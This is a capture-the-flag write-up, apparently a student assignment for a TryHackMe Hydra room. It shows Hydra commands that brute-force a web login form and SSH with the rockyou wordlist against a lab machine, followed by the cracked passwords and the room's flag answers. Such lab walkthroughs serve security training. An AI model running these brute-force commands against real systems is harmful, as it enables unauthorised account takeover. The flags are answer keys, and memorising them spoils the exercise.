# 🔐 Hydra Brute Force Assignment

## 📌 Introduction
This project demonstrates how to use Hydra to perform brute force attacks on web login and SSH service.

---

## ⚙️ Tools Used
- Kali Linux
- Hydra
- Rockyou.txt

---

## 🧪 Task 1: Web Brute Force (HTTP POST)

In the terminal, paste this command:

### Command
```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt http-post-form "/login:username=^USER^&password=^PASS^:incorrect"
```

It tries all the passwords from rockyou.txt and shows the correct password which in our case is

[80][http-post-form] host: Machine’s IP login: molly password: sunshine
```bash
login: molly
password: sunshine
```

<p align="center">
  <img src="screnshort/ICMP.png" width="600">
</p>

so use this password to log into the webpage that is in the Machine’s IP.

### Result
- Username: molly
- Password: sunshine

### Screenshot
<p align="center">
  <img src="screnshort/ICMP.png" width="600">
</p>

Flag 1
<p align="center">
  <img src="screnshort/ICMP.png" width="600">
</p>

### Flag 1
```
THM{2673a7dd116de68e85c48ec0b1f2612e}
```

---

## 🔑 Task 2: SSH Brute Force

Here you need to brute force the SSH password. So, try brute forcing ssh password with following command:

### Command
```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt ssh://10.48.186.172
```
Now here you will again get a valid password in highlighted text
```bash
login: molly
password: butterfly
```

Now, think for a while and you will get to a point that the flag must be in the machine so you must login via SSH. so login to the machine using SSH:
```bash
ssh molly@10.48.186.172 (Your Machine IP)
```

now type “Yes” if it asks you whether you want to continue.
Enter the password, i.e: butterfly
<p align="center">
  <img src="screnshort/ICMP.png" width="600">
</p>

### Result
- Username: molly
- Password: butterfly

Now when you get logged in, try
```bash
ls
```

so there is a file 
```bash
flag2.txt
```

Now cat the file
```bash
cat flag2.txt
```

<p align="center">
  <img src="screnshort/ICMP.png" width="600">
</p>

### Flag 2
```
THM{c8eeb0468febbadea859baeb33b2541b}
```



